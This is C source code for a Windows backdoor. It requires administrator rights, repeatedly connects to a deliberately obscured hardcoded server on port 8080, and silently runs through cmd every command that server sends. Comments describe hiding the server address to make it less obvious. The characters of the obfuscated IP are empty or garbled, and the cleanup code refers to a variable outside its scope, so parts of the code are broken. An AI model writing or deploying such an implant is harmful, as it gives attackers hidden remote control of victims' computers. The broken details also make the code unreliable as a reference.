#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shellapi.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 4096

// Hardcoded server IP - making it difficult to modify
const char* get_server_ip() {
    // Using a function to make it less obvious
    static char ip[16] = {0};
    if (ip[0] == 0) {
        // Obfuscated IP assignment
        ip[0] = ''; ip[1] = ''; ip[2] = ''; ip[3] = ''; ip[4] = '';
        ip[5] = ''; ip[6] = ''; ip[7] = ''; ip[8] = ''; ip[9] = '';
        ip[10] = '\';
    }
    return ip;
}

void execute_command(const char* command) {
    // Create a buffer for the command with "cmd /c " prefix
    char full_command[BUFFER_SIZE + 8];
    snprintf(full_command, sizeof(full_command), "cmd /c %s", command);
    
    // Execute the command silently with output redirected to NUL
    char silent_command[BUFFER_SIZE + 16];
    snprintf(silent_command, sizeof(silent_command), "%s > NUL 2>&1", full_command);
    
    // Execute the command completely silently
    system(silent_command);
}

int main() {
    // Admin check
    if (!IsUserAnAdmin()) {
        printf("ERROR: This application must be run as Administrator.\n");
        printf("Please right-click this application and select 'Run as administrator'.\n");
        system("pause");
        return 1;
    }

    // Start Winsock
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        return 1;
    }

    char server_reply[BUFFER_SIZE];
    
    while (1) {  // Continuous loop
        int sock;
        struct sockaddr_in server;

        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            Sleep(5000);  // Wait 5 seconds before retrying
            continue;
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(8080);
        // Use the hardcoded IP function
        inet_pton(AF_INET, get_server_ip(), &server.sin_addr);

        // Connect
        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            closesocket(sock);
            Sleep(5000);  // Wait 5 seconds before retrying
            continue;
        }

        // Send initial message to identify the client
        const char* init_message = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n";
        send(sock, init_message, strlen(init_message), 0);

        // Continuous command loop
        while (1) {
            // Receive command from server
            int recv_size = recv(sock, server_reply, BUFFER_SIZE-1, 0);
            
            if (recv_size <= 0) {
                closesocket(sock);
                break;  // Break inner loop to reconnect
            }
            
            server_reply[recv_size] = '\0';
            
            // Execute any command received from the server silently
            execute_command(server_reply);
            
            // Send a response back to the server
            const char* response = "Command executed\r\n";
            send(sock, response, strlen(response), 0);
        }
    }

    // This code will never be reached due to the infinite loop
    closesocket(sock);
    WSACleanup();
    return 0;
}
